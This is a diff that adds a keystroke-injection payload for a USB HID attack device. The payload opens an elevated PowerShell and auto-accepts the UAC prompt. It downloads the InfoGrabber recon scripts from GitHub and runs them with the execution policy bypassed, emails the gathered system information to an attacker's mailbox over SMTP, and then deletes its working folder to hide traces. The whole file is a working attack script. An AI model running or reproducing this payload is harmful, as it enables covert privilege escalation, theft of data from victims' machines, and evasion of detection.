@@ -1,0 +1,39 @@
+Rem:*****************
+Rem:# Let's Get Privileged
+Rem:*****************
+Rem:#GUI r
+Press:131+114
+CustomDelay:100
+Rem:#-windowstyle hidden doesn't work with cactus right now
+Print:powershell Start-Process powershell -Verb runAs 
+Press:176
+Rem:# Might need ALT y command here#
+CustomDelay:500
+Press:130+121
+CustomDelay:1000
+Rem:*****************
+Rem:# Get High on Quack #
+Rem:*****************
+Print:New-Item -ItemType directory -Path C:\quactus\; cd C:\quactus\; cls
+Press:176
+CustomDelay:150
+Print:$source = "https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/run.ps1"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Press:176
+CustomDelay:100
+Print:$source = "https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/info.ps1"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Press:176
+CustomDelay:100
+Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1; cls
+Press:176
+CustomDelay:1000
+Rem:*****************
+Rem:# Let's e-mail ourselves and clean up #
+Rem:*****************
+Print:$SMTPServer = 'SMTP.MAIL.COMHERE'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSSL = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAILHERE', 'YOURPASSWORDHERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUREMAILHERE'; $ReportEmail.To.Add('YOUREMAILHERE'); $ReportEmail.Subject = 'That's a Prickly Cactus Quack Quack'; $ReportEmail.Body = (Get-Content C:\quactus\info\* | out-string); $SMTPInfo.Send($ReportEmail); cd ..; cls
+Press:176
+CustomDelay:1000
+Rem:*****************
+Rem:# Cleanup
+Rem:*****************
+Print:Remove-Item -path C:\quactus -recurse -force; cls; exit
+Press:176
